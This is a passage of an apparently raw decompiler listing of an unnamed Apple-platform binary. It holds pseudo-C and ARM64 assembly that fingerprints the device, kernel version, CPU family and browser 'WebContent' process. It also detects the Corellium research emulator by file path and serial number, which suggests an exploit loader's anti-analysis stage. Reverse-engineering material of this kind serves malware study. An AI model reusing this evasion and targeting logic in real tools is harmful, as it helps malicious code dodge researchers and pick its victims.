      return 0xFFFFFFFFLL;
  }
  v3 = CFStringCreateWithCString(kCFAllocatorDefault, "ProductVersion", 0x8000100u);
  if ( !v3 )
    goto LABEL_10;
  v4 = v3;
  Value = (const __CFString *)CFDictionaryGetValue(v2, v3);
  if ( !Value || (v6 = Value, v7 = CFGetTypeID(Value), v7 != CFStringGetTypeID()) )
  {
    CFRelease(v4);
LABEL_10:
    CFRelease(v2);
    return 0xFFFFFFFFLL;
  }
  SystemEncoding = CFStringGetSystemEncoding();
  CString = CFStringGetCString(v6, buffer, 32, SystemEncoding);
  CFRelease(v4);
  CFRelease(v2);
  if ( !CString )
    return 0xFFFFFFFFLL;
  if ( sscanf(buffer, "%d.%d.%d", &v14, &v13, &v12) < 2 )
    return 4294967294LL;
  *a1 = (v13 << 8) | (v14 << 16) | v12;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_71FC
// Address:  0x71FC  Size: 808 bytes
// Calls:    _stat, _getpid, _sandbox_check, _dlopen, _dlsym, sub_5D2C, sub_B0FC, _CFStringCreateWithCString, _CFStringGetTypeID, _CFGetTypeID, _CFStringGetCString, _CFRelease, _dlclose
// Xrefs:    3 callers
// Strings:  "/usr/libexec/corelliumd", "IOPlatformSerialNumber", "iokit-get-properties", "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", "kIOMasterPortDefault", "IORegistryEntryFromPath", "IORegistryEntryCreateCFProperty", "IOObjectRelease", "IODeviceTree:/", "IOPlatformSerialNumber"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_71FC(_BYTE *a1)
{
  __int64 v2; // x0
  void *v3; // x0
  void *v4; // x20
  unsigned int *v5; // x0
  unsigned int *v6; // x22
  __int64 v7; // x0
  __int64 v8; // x24
  __int64 v9; // x0
  __int64 v10; // x23
  __int64 v11; // x0
  __int64 v12; // x2
  __int64 v13; // x0
  __int64 v14; // x22
  CFStringRef v15; // x0
  __int64 v16; // x1
  __int64 v17; // x2
  CFStringRef v18; // x24
  __int64 v19; // x0
  const __CFString *v20; // x23
  CFTypeID TypeID; // x25
  int v22; // w25
  unsigned __int64 v24; // x8
  __int64 v25; // x8
  __int64 v26; // x9
  __int64 v27; // x0
  unsigned __int64 v28; // x20
  __int64 v29; // x0
  int v30; // w8
  stat v33; // [xsp+10h] [xbp-110h] BYREF
  char buffer[16]; // [xsp+A0h] [xbp-80h] BYREF
  __int128 v35; // [xsp+B0h] [xbp-70h]
  __int128 v36; // [xsp+C0h] [xbp-60h]
  __int128 v37; // [xsp+D0h] [xbp-50h]

  if ( !a1 )
    return 0xFFFFFFFFLL;
  v36 = 0u;
  v37 = 0u;
  *(_OWORD *)buffer = 0u;
  v35 = 0u;
  memset(&v33, 0, sizeof(v33));
  if ( stat("/usr/libexec/corelliumd", &v33) )
  {
    v2 = getpid();
    if ( (int)sandbox_check(v2, "iokit-get-properties", SANDBOX_CHECK_NO_REPORT) <= 0 )
    {
      v3 = dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", 1);
      if ( v3 )
      {
        v4 = v3;
        dlsym(v3, "kIOMasterPortDefault");
        sub_5D2C();
        v6 = v5;
        dlsym(v4, "IORegistryEntryFromPath");
        sub_5D2C();
        v8 = v7;
        dlsym(v4, "IORegistryEntryCreateCFProperty");
        sub_5D2C();
        v10 = v9;
        dlsym(v4, "IOObjectRelease");
        sub_5D2C();
        if ( v8 && v10 && v11 && v6 && (v13 = sub_B0FC(*v6, "IODeviceTree:/", v12), (_DWORD)v13) )
        {
          v14 = v13;
          v15 = CFStringCreateWithCString(kCFAllocatorDefault, "IOPlatformSerialNumber", 0x8000100u);
          if ( v15 )
          {
            v18 = v15;
            v19 = sub_B0FC(v14, v15, kCFAllocatorDefault);
            if ( v19 && (v20 = (const __CFString *)v19, TypeID = CFStringGetTypeID(), TypeID == CFGetTypeID(v20)) )
            {
              if ( CFStringGetCString(v20, buffer, 64, 0x8000100u) )
                v22 = 0;
              else
                v22 = -1;
              CFRelease(v20);
            }
            else
            {
              v22 = -1;
            }
            CFRelease(v18);
          }
          else
          {
            v22 = -1;
          }
          sub_B0FC(v14, v16, v17);
          dlclose(v4);
          if ( !v22 )
          {
            v25 = *(_QWORD *)buffer ^ 0x55494C4C45524F43LL;
            v26 = (unsigned __int8)buffer[8] ^ 0x4DLL;
            v36 = 0u;
            v37 = 0u;
            *(_OWORD *)buffer = 0u;
            v35 = 0u;
            v24 = v25 | v26;
            if ( !v24 )
              goto LABEL_38;
          }
        }
        else
        {
          dlclose(v4);
        }
      }
    }
    sub_5D2C();
    v28 = *(_QWORD *)(v27 + 12) & 0xFFFFFFFFFFFFFF00LL;
    if ( !v28 )
      return 0xFFFFFFFFLL;
    sub_5D2C();
    v24 = *(_QWORD *)(v29 + 12) & 0xFFFFFFFFFFFFFF00LL;
    if ( v24 )
    {
      v30 = *(_DWORD *)&stru_68.segname[(*(_QWORD *)(v29 + 12) & 0xFFFFFFFFFFFFFF00LL) + 8];
      if ( v30 == -1829029944 || v30 == 933271106 || v30 == 747742334 )
        LODWORD(v24) = (*(_DWORD *)(v28 + 16) >> 26) & 1;
      else
        LODWORD(v24) = *(unsigned __int16 *)(v28 + 38) != 128;
    }
    LOBYTE(v24) = (_DWORD)v24 == 0;
  }
  else
  {
    LOBYTE(v24) = 0;
  }
LABEL_38:
  *a1 = v24;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7524
// Address:  0x7524  Size: 276 bytes
// Calls:    sub_5D2C, sub_B0FC, sub_71FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7524(_BYTE *a1)
{
  __int64 v2; // x0
  char v3; // w8
  int v4; // w9
  bool v5; // zf
  int v6; // w10
  char v9; // [xsp+Fh] [xbp-11h] BYREF

  if ( !a1 )
    return 0xFFFFFFFFLL;
  v9 = 0;
  sub_5D2C();
  if ( (*(_QWORD *)(v2 + 12) & 0xFFFFFFFFFFFFFF00LL) == 0 )
    return 4294967294LL;
  v3 = 0;
  v4 = *(_DWORD *)&stru_68.segname[(*(_QWORD *)(v2 + 12) & 0xFFFFFFFFFFFFFF00LL) + 8];
  if ( v4 <= 458787762 )
  {
    v5 = v4 == -2023363094;
    v6 = -634136515;
  }
  else
  {
    v5 = v4 == 458787763 || v4 == 1176831186;
    v6 = 678884789;
  }
  if ( v5 || v4 == v6 )
  {
    if ( (unsigned int)sub_71FC(&v9) )
      return 4294967293LL;
    v3 = v9;
  }
  *a1 = v3;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7638
// Address:  0x7638  Size: 232 bytes
// Calls:    sub_5D2C, sub_71FC, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7638(char *a1)
{
  __int64 v2; // x0
  int v3; // w8
  char v6; // w8
  char v7; // [xsp+Fh] [xbp-11h] BYREF

  if ( !a1 )
    return 0xFFFFFFFFLL;
  sub_5D2C();
  if ( (*(_QWORD *)(v2 + 12) & 0xFFFFFFFFFFFFFF00LL) == 0 )
    return 4294967294LL;
  v3 = *(_DWORD *)&stru_68.segname[(*(_QWORD *)(v2 + 12) & 0xFFFFFFFFFFFFFF00LL) + 8];
  if ( v3 == 131287967 || v3 == -400654602 )
  {
    v7 = 1;
    if ( (unsigned int)sub_71FC(&v7) )
      return 4294967293LL;
    v6 = v7;
  }
  else
  {
    v6 = 0;
  }
  *a1 = v6;
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7720  [ASM — decompile() returned None]
// Address:  0x7720  Size: 888 bytes
// Calls:    _task_info, _strstr, sub_5D2C, sub_7090, _sysctl, sub_B0FC, _mach_host_self, _host_kernel_version, _sscanf, sub_7638, sub_7524
// Xrefs:    2 callers
// Strings:  "WebContent", "WebContent", "RELEASE", "xnu-", "xnu-%d.%d.%d.%d.%d%*s"
////////////////////////////////////////////////////////////////////////

// REF: "WebContent"
// REF: "WebContent"
// REF: "RELEASE"
// REF: "xnu-"
// REF: "xnu-%d.%d.%d.%d.%d%*s"
  0x7720:  STP             X24, X23, [SP,#-0x10+var_30]!
  0x7724:  STP             X22, X21, [SP,#0x30+var_20]
  0x7728:  STP             X20, X19, [SP,#0x30+var_10]
  0x772C:  STP             X29, X30, [SP,#0x30+var_s0]
  0x7730:  ADD             X29, SP, #0x30
  0x7734:  SUB             SP, SP, #0x250
  0x7738:  MOV             X19, X0
  0x773C:  MOV             W8, #5
  0x7740:  STR             W8, [SP,#0x280+task_info_outCnt]
  0x7744:  NOP
  0x7748:  LDR             X8, =_mach_task_self_
  0x774C:  LDR             W0, [X8]; target_task    ; target_task
  0x7750:  ADD             X2, SP, #0x280+task_info_out; task_info_out    ; task_info_out
  0x7754:  ADD             X3, SP, #0x280+task_info_outCnt; task_info_outCnt    ; task_info_outCnt
  0x7758:  MOV             W1, #0x11; flavor    ; flavor
  0x775C:  BL              _task_info
  0x7760:  LDR             X8, [SP,#0x280+task_info_out]
  0x7764:  CMP             W0, #0
  0x7768:  CCMP            X8, #0, #4, EQ
  0x776C:  B.EQ            loc_78B8
  0x7770:  LDR             X9, [X8,#0x20]
  0x7774:  CBZ             X9, loc_78B8
  0x7778:  LDP             W22, W9, [X9,#4]
  0x777C:  AND             W21, W9, #0xFFFFFF
  0x7780:  STP             W22, W21, [X19,#0xD8]
  0x7784:  LDR             W20, [X8,#4]
  0x7788:  CBZ             W20, loc_78B8
  0x778C:  LDR             X23, [X8,#8]
  0x7790:  CBZ             X23, loc_78B8
  0x7794:  LDR             X0, [X23,#8]; __big    ; __big
  0x7798:  ADR             X1, aWebcontent; "WebContent"
  0x779C:  NOP
  0x77A0:  BL              _strstr
  0x77A4:  CBZ             X0, loc_77B0
  0x77A8:  MOV             W20, #1
  0x77AC:  B               loc_77D4
  0x77B0:  SUB             W8, W20, #1
  0x77B4:  MOV             W9, #0x18
  0x77B8:  UMADDL          X8, W8, W9, X23
  0x77BC:  LDR             X0, [X8,#8]; __big    ; __big
  0x77C0:  ADR             X1, aWebcontent; "WebContent"
  0x77C4:  NOP
  0x77C8:  BL              _strstr
  0x77CC:  CMP             X0, #0
  0x77D0:  CSET            W20, NE
  0x77D4:  STRB            W20, [X19,#0x5FC]
  0x77D8:  NOP
  0x77DC:  LDR             X0, =__get_cpu_capabilities
  0x77E0:  BL              sub_5D2C
  0x77E4:  LDUR            X8, [X0,#0xC]
  0x77E8:  ANDS            X8, X8, #0xFFFFFFFFFFFFFF00
  0x77EC:  B.EQ            loc_78B8
  0x77F0:  LDR             W8, [X8,#0x80]
  0x77F4:  STR             W8, [X19,#0xE0]
  0x77F8:  NOP
  0x77FC:  LDR             X0, =__get_cpu_capabilities
  0x7800:  BL              sub_5D2C
  0x7804:  LDUR            X8, [X0,#0xC]
  0x7808:  ANDS            X8, X8, #0xFFFFFFFFFFFFFF00
  0x780C:  B.EQ            loc_78B8
  0x7810:  LDR             X8, [X8,#0x38]
  0x7814:  STR             X8, [X19,#0x640]
  0x7818:  ADD             X0, SP, #0x280+var_250
  0x781C:  BL              sub_7090
  0x7820:  CBNZ            W0, loc_78BC
  0x7824:  LDR             W23, [SP,#0x280+var_250]
  0x7828:  STR             W23, [X19,#0xC0]
  0x782C:  MOVI            V0.16B, #0
  0x7830:  STP             Q0, Q0, [SP,#0x280+var_50]
  0x7834:  STP             Q0, Q0, [SP,#0x280+var_70]
  0x7838:  STP             Q0, Q0, [SP,#0x280+var_90]
  0x783C:  STP             Q0, Q0, [SP,#0x280+var_B0]
  0x7840:  STP             Q0, Q0, [SP,#0x280+var_D0]
  0x7844:  STP             Q0, Q0, [SP,#0x280+var_F0]
  0x7848:  STP             Q0, Q0, [SP,#0x280+var_110]
  0x784C:  STP             Q0, Q0, [SP,#0x280+var_130]
  0x7850:  STP             Q0, Q0, [SP,#0x280+var_150]
  0x7854:  STP             Q0, Q0, [SP,#0x280+var_170]
  0x7858:  STP             Q0, Q0, [SP,#0x280+var_190]
  0x785C:  STP             Q0, Q0, [SP,#0x280+var_1B0]
  0x7860:  STP             Q0, Q0, [SP,#0x280+var_1D0]
  0x7864:  STP             Q0, Q0, [SP,#0x280+var_1F0]
  0x7868:  STP             Q0, Q0, [SP,#0x280+var_210]
  0x786C:  AND             W8, W23, #0xFE0000
  0x7870:  STP             Q0, Q0, [SP,#0x280+task_info_out]
  0x7874:  CMP             W8, #0xD0,LSL#12
  0x7878:  B.LS            loc_78F8
  0x787C:  MOV             X8, #0x400000001
  0x7884:  STR             X8, [SP,#0x280+var_240]
  0x7888:  MOV             W8, #0x200
  0x788C:  STR             X8, [SP,#0x280+task_info_outCnt]
  0x7890:  ADD             X0, SP, #0x280+var_240; int *    ; int *
  0x7894:  ADD             X2, SP, #0x280+task_info_out; void *    ; void *
  0x7898:  ADD             X3, SP, #0x280+task_info_outCnt; size_t *    ; size_t *
  0x789C:  MOV             W1, #2; u_int    ; u_int
  0x78A0:  MOV             X4, #0; void *    ; void *
  0x78A4:  MOV             X5, #0; size_t    ; size_t
  0x78A8:  BL              _sysctl
  0x78AC:  CBZ             W0, loc_7908
  0x78B0:  MOV             W0, #0xFFFFFFFE
  0x78B4:  B               loc_78BC
  0x78B8:  MOV             W0, #0xFFFFFFFF
  0x78BC:  ADD             SP, SP, #0x250
  0x78C0:  LDP             X29, X30, [SP,#0x30+var_s0]
  0x78C4:  LDP             X20, X19, [SP,#0x30+var_10]
  0x78C8:  LDP             X22, X21, [SP,#0x30+var_20]
  0x78CC:  LDP             X24, X23, [SP+0x30+var_30],#0x40
  0x78D0:  MOV             X10, X30
  0x78D4:  MOV             X30, #0xAAAAAAAAAAAAAAAA
  0x78D8:  XPACLRI
  0x78DC:  MOV             X11, #0xAAAAAAAAAAAAAAAA
  0x78E0:  CMP             X11, X30
  0x78E4:  MOV             X30, X10
  0x78E8:  B.NE            loc_78F0
  0x78EC:  RET
  0x78F0:  MOV             X10, X30
  0x78F4:  BL              sub_B0FC
  0x78F8:  BL              _mach_host_self
  0x78FC:  ADD             X1, SP, #-0x10+__big; kernel_version    ; kernel_version
  0x7900:  BL              _host_kernel_version
  0x7904:  CBNZ            W0, loc_78B0
  0x7908:  ADR             X1, aRelease; "RELEASE"
  0x790C:  NOP
  0x7910:  ADD             X0, SP, #-0x10+__big; __big    ; __big
  0x7914:  BL              _strstr
  0x7918:  CBZ             X0, loc_7A14
  0x791C:  ADR             X1, aXnu; "xnu-"
  0x7920:  NOP
  0x7924:  ADD             X0, SP, #-0x10+__big; __big    ; __big
  0x7928:  BL              _strstr
  0x792C:  CBZ             X0, loc_7A1C
  0x7930:  STR             WZR, [SP,#-0x10+arg_48]
  0x7934:  STR             WZR, [SP,#-0x10+arg_40]
  0x7938:  STR             XZR, [SP,#-0x10+arg_38]
  0x793C:  STR             WZR, [SP,#-0x10+arg_34]
  0x7940:  ADD             X8, SP, #-0x10+arg_34
  0x7944:  STR             X8, [SP,#-0x10+arg_20]
  0x7948:  ADD             X8, SP, #-0x10+arg_38
  0x794C:  ADD             X9, SP, #-0x10+arg_38+4
  0x7950:  STP             X9, X8, [SP,#-0x10+arg_10]
  0x7954:  ADD             X8, SP, #-0x10+arg_40
  0x7958:  ADD             X9, SP, #-0x10+arg_48
  0x795C:  STP             X9, X8, [SP,#-0x10+arg_0]
  0x7960:  ADR             X1, aXnuDDDDDS; "xnu-%d.%d.%d.%d.%d%*s"
  0x7964:  NOP
  0x7968:  BL              _sscanf
  0x796C:  CMP             W0, #2
  0x7970:  B.LE            loc_7A24
  0x7974:  LDR             W8, [SP,#-0x10+arg_48]
  0x7978:  LSL             W9, W8, #0x12
  0x797C:  LDP             W11, W10, [SP,#-0x10+arg_38+4]
  0x7980:  BFI             W9, W10, #9, #9
  0x7984:  BFXIL           W9, W11, #0, #9
  0x7988:  AND             W8, W8, #0x7FFF
  0x798C:  LSL             X8, X8, #0x14
  0x7990:  LSL             W10, W10, #0xA
  0x7994:  BFXIL           X8, X10, #0, #0x14
  0x7998:  BFXIL           X8, X11, #0, #0xA
  0x799C:  LDR             W10, [SP,#-0x10+arg_38]
  0x79A0:  LSL             W10, W10, #0xA
  0x79A4:  AND             X10, X10, #0xFFC00
  0x79A8:  BFI             X10, X8, #0x14, #0x23 ; '#'
  0x79AC:  LDR             W8, [SP,#-0x10+arg_34]
  0x79B0:  BFXIL           X10, X8, #0, #0xA
  0x79B4:  STR             W9, [X19,#0xC8]
  0x79B8:  STR             X10, [X19,#0xD0]
  0x79BC:  ADD             X0, SP, #-0x10+__big
  0x79C0:  BL              sub_7638
  0x79C4:  CBNZ            W0, loc_78BC
  0x79C8:  LDRB            W8, [SP,#-0x10+__big]
  0x79CC:  STRB            W8, [X19,#0x5C0]
  0x79D0:  ADD             X0, SP, #-0x10+arg_48
  0x79D4:  BL              sub_7524
  0x79D8:  CBNZ            W0, loc_78BC
  0x79DC:  MOV             W9, #0
  0x79E0:  LDRB            W8, [SP,#-0x10+arg_48]
  0x79E4:  STRB            W8, [X19,#0x5C1]
  0x79E8:  MOV             W10, #0x100000C
  0x79F0:  CMP             W22, W10
  0x79F4:  B.NE            loc_7A3C
  0x79F8:  CMP             W21, #2
  0x79FC:  B.CC            loc_7A3C
  0x7A00:  UBFX            W9, W23, #0x10, #8
  0x7A04:  CMP             W9, #0xC
  0x7A08:  B.LS            loc_7A2C
  0x7A0C:  MOV             W9, #1
  0x7A10:  B               loc_7A3C
  0x7A14:  MOV             W0, #0xFFFFFFFD
  0x7A18:  B               loc_78BC
  0x7A1C:  MOV             W0, #0xFFFFFFFC
  0x7A20:  B               loc_78BC
  0x7A24:  MOV             W0, #0xFFFFFFFB
  0x7A28:  B               loc_78BC
  0x7A2C:  CSET            W9, EQ
  0x7A30:  TST             W23, #0xFF00
  0x7A34:  CSET            W10, NE
  0x7A38:  AND             W9, W9, W10
  0x7A3C:  STRB            W9, [X19,#0x5C3]
  0x7A40:  CBZ             W8, loc_7A88
  0x7A44:  LDR             W8, [X19,#0xC0]
  0x7A48:  LSR             W8, W8, #0xA
  0x7A4C:  CMP             W8, #0x3C1
  0x7A50:  B.CC            loc_7A88
  0x7A54:  LDR             W8, [X19,#0xE0]
  0x7A58:  MOV             W9, #0x8765EDEA
  0x7A60:  CMP             W8, W9
  0x7A64:  B.EQ            loc_7A8C
  0x7A68:  MOV             W9, #0xDA33D83D
  0x7A70:  CMP             W8, W9
  0x7A74:  B.EQ            loc_7A8C
  0x7A78:  MOV             W9, #0x2876F5B5
  0x7A80:  CMP             W8, W9
  0x7A84:  B.EQ            loc_7A8C
  0x7A88:  MOV             W20, #0
  0x7A8C:  MOV             W0, #0
  0x7A90:  STRB            W20, [X19,#0x5E9]
  0x7A94:  B               loc_78BC


////////////////////////////////////////////////////////////////////////
// Function: sub_7A98
// Address:  0x7A98  Size: 264 bytes
// Calls:    _strlen, _CFURLCreateFromFileSystemRepresentation, _CFReadStreamCreateWithFile, _CFReadStreamOpen, _CFPropertyListCreateWithStream, _CFRelease, _CFReadStreamClose, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

CFPropertyListRef __fastcall sub_7A98(const char *a1)
{
  size_t v2; // x0
  const __CFURL *v3; // x0
  const __CFURL *v4; // x19
  __CFReadStream *v5; // x0
  __CFReadStream *v6; // x20
  CFPropertyListRef v7; // x21
  bool v8; // zf
  CFErrorRef error; // [xsp+8h] [xbp-28h] BYREF

  error = 0;
  v2 = strlen(a1);
  v3 = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8 *)a1, v2, 0);
  if ( !v3 )
    return 0;
  v4 = v3;
  v5 = CFReadStreamCreateWithFile(kCFAllocatorDefault, v3);
  if ( v5 )
  {
    v6 = v5;
    if ( CFReadStreamOpen(v5) )
    {
      v7 = CFPropertyListCreateWithStream(kCFAllocatorDefault, v6, 0, 0, 0, &error);
      if ( v7 )
        v8 = 1;
      else
        v8 = error == 0;
      if ( !v8 )
        CFRelease(error);
      CFReadStreamClose(v6);
    }
    else
    {
      v7 = 0;
    }
    CFRelease(v4);
  }
  else
  {
    v7 = 0;
    v6 = v4;
  }
  CFRelease(v6);
  return v7;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BA0
// Address:  0x7BA0  Size: 8 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_7BA0()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BA8
// Address:  0x7BA8  Size: 8 bytes
////////////////////////////////////////////////////////////////////////

void sub_7BA8()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BB0
// Address:  0x7BB0  Size: 8 bytes
////////////////////////////////////////////////////////////////////////

void sub_7BB0()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BB8
// Address:  0x7BB8  Size: 8 bytes
////////////////////////////////////////////////////////////////////////

void sub_7BB8()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BC0
// Address:  0x7BC0  Size: 44 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_7BC0()
{
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7BEC
// Address:  0x7BEC  Size: 36 bytes
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7BEC(__int64 a1)
{
  __asm { BR              X0 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7C10
// Address:  0x7C10  Size: 32 bytes
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7C10(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  _BYTE v4[32]; // [xsp+0h] [xbp-30h]

  *(_DWORD *)&v4[a4] = a2;
  __asm { BR              X0 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7C30
// Address:  0x7C30  Size: 32 bytes
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7C30(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  _BYTE v4[48]; // [xsp+0h] [xbp-40h]

  *(_DWORD *)&v4[a4] = a2;
  __asm { BR              X0 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7C50
// Address:  0x7C50  Size: 40 bytes
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7C50(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  _BYTE v4[16]; // [xsp+0h] [xbp-40h]

  *(_DWORD *)&v4[a4] = a2;
  __asm { BR              X0 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7C78
// Address:  0x7C78  Size: 36 bytes
////////////////////////////////////////////////////////////////////////

void __fastcall sub_7C78(__int64 a1, int a2, __int64 a3, __int64 a4)
{
  _BYTE v4[32]; // [xsp+0h] [xbp-40h]

  *(_DWORD *)&v4[a4] = a2;
  __asm { BR              X0 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7C9C
// Address:  0x7C9C  Size: 372 bytes
// Calls:    sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7C9C(__int64 a1, int a2, _DWORD *a3, unsigned int a4)
{
  __int64 v4; // x8
  __int64 v6; // x9
  __int64 v7; // x10
  unsigned __int64 v8; // x13
  __int64 v10; // d1
  int v11; // w8
  __int64 v12; // x15
  int v13; // w13
  __int64 v14; // x14
  char *v15; // x14
  __int64 v16; // x16
  int v17; // w17
  __int64 v19; // x8
  __int64 v20; // x9
  int v21; // w10

  v4 = 708609;
  if ( a1 && a3 && a4 )
  {
    if ( a4 < 4 )
      return 28676;
    if ( *a3 == -267534609 )
    {
      if ( a4 < 9 )
        return 28676;
      v6 = (unsigned int)a3[1];
      if ( (int)v6 < 1 )
      {
        return 0;
      }
      else
      {
        v7 = 0;
        while ( 1 )
        {
          v8 = (unsigned __int64)&a3[4 * v7 + 2];
          if ( v8 < (unsigned __int64)a3 || (unsigned __int64)a3 + a4 <= v8 )
            break;
          v10 = *(_QWORD *)v8;
          v11 = *(_QWORD *)v8;
          if ( !v11 )
            return 28684;
          v12 = 0;
          v14 = *(unsigned int *)(v8 + 8);
          v13 = *(_DWORD *)(v8 + 12);
          v15 = (char *)a3 + v14;
          while ( 1 )
          {
            v16 = a1 + v12;
            v17 = *(_DWORD *)(a1 + v12 + 320);
            if ( !v17 || v17 == v11 )
              break;
            v12 += 48;
            if ( v12 == 1152 )
              return 708617;
          }
          v4 = 0;
          *(_OWORD *)(v16 + 320) = 0u;
          *(_OWORD *)(v16 + 336) = 0u;
          *(_OWORD *)(v16 + 352) = 0u;
          *(_QWORD *)(v16 + 320) = v10;
          *(_QWORD *)(v16 + 328) = v15;
          ++v7;
          *(_DWORD *)(v16 + 336) = v13;
          if ( v7 == v6 )
            return v4;
        }
        return 28677;
      }
    }
    else if ( a2 )
    {
      v19 = 0;
      while ( 1 )
      {
        v20 = a1 + v19;
        v21 = *(_DWORD *)(a1 + v19 + 320);
        if ( !v21 || v21 == a2 )
          break;
        v19 += 48;
        if ( v19 == 1152 )
          return 708617;
      }
      v4 = 0;
      *(_OWORD *)(v20 + 320) = 0u;
      *(_OWORD *)(v20 + 336) = 0u;
      *(_OWORD *)(v20 + 352) = 0u;
      *(_DWORD *)(v20 + 320) = a2;
      *(_DWORD *)(v20 + 324) = 1;
      *(_QWORD *)(v20 + 328) = a3;
      *(_DWORD *)(v20 + 336) = a4;
    }
    else
    {
      return 28684;
    }
  }
  return v4;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7E10
// Address:  0x7E10  Size: 196 bytes
// Calls:    sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7E10(__int64 a1)
{
  __int64 i; // x20
  __int64 v3; // x21
  __int64 result; // x0
  __int64 v5; // x10

  for ( i = 0; i != 1152; i += 48 )
  {
    if ( *(_DWORD *)(a1 + i + 320) )
    {
      if ( *(_DWORD *)(a1 + i + 324) )
      {
        v3 = a1 + i;
        if ( !*(_QWORD *)(a1 + i + 360) )
        {
          result = sub_B0FC(a1, *(_QWORD *)(v3 + 328), *(unsigned int *)(v3 + 336));
          if ( (_DWORD)result )
            return result;
          *(_QWORD *)(v3 + 360) = 0;
          v5 = a1 + i;
          *(_QWORD *)(v5 + 344) = 0x500000005LL;
          *(_DWORD *)(v5 + 352) = -2147482624;
        }
      }
    }
  }
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7ED4
// Address:  0x7ED4  Size: 244 bytes
// Calls:    sub_B0FC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7ED4(__int64 a1, int a2)
{
  __int64 result; // x0
  __int64 v5; // x20
  __int64 v6; // x21
  __int64 v7; // x1
  __int64 v8; // x2
  __int64 v9; // x10

  result = 708609;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 48) && a2 != 0 )
    {
      v5 = 0;
      while ( 1 )
      {
        v6 = a1 + v5;
        if ( *(_DWORD *)(a1 + v5 + 320) == a2 )
          break;
        v5 += 48;
        if ( v5 == 1152 )
          return 28675;
      }
      if ( *(_QWORD *)(v6 + 360) )
      {
        return 28673;
      }
      else
      {
        v7 = *(_QWORD *)(a1 + v5 + 328);
        if ( v7 && (v8 = *(unsigned int *)(a1 + v5 + 336), (_DWORD)v8) )
        {
          result = sub_B0FC(a1, v7, v8);
          if ( !(_DWORD)result )
          {
            *(_QWORD *)(v6 + 360) = 0;
            v9 = a1 + v5;
            *(_QWORD *)(v9 + 344) = 0x500000005LL;
            *(_DWORD *)(v9 + 352) = -2147482624;
          }
        }
        else
        {
          return 28674;
        }
      }
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7FC8
// Address:  0x7FC8  Size: 184 bytes
// Calls:    sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7FC8(__int64 a1, int a2, __int64 a3)
{
  __int64 result; // x0
  __int64 v6; // x20
  __int64 v7; // x21
  __int64 v8; // x1
  __int64 v9; // x8

  result = 708609;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 304) && a2 != 0 )
    {
      v6 = 0;
      while ( 1 )
      {
        v7 = a1 + v6;
        if ( *(_DWORD *)(a1 + v6 + 320) == a2 )
          break;
        v6 += 48;
        if ( v6 == 1152 )
          return 28675;
      }
      v8 = *(_QWORD *)(v7 + 360);
      if ( !v8 || (result = sub_B0FC(a1, v8, a3), !(_DWORD)result) )
      {
        *(_QWORD *)(v7 + 360) = 0;
        v9 = a1 + v6;
        *(_QWORD *)(v9 + 344) = 0;
        *(_DWORD *)(v9 + 352) = 0;
        return 0;
      }
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_8080
// Address:  0x8080  Size: 172 bytes
// Calls:    sub_7ED4, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_8080(__int64 a1, int a2, _QWORD *a3)
{
  __int64 v3; // x8
  __int64 v5; // x8
  __int64 v6; // x20
  __int64 v7; // x9

  v3 = 708609;
  if ( a1 )
  {
    if ( a3 )
    {
      *a3 = 0;
      if ( a2 )
      {
        v5 = 0;
        while ( 1 )
        {
          v6 = a1 + v5;
          if ( *(_DWORD *)(a1 + v5 + 320) == a2 )
            break;
          v5 += 48;
          if ( v5 == 1152 )
            return 28675;
        }
        v7 = *(_QWORD *)(v6 + 360);
        if ( !v7 )
        {
          v3 = sub_7ED4(a1, a2);
          if ( (_DWORD)v3 )
            return v3;
          v7 = *(_QWORD *)(v6 + 360);
        }
        v3 = 0;
        *a3 = v7;
      }
    }
  }
  return v3;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_812C
// Address:  0x812C  Size: 228 bytes
// Calls:    sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

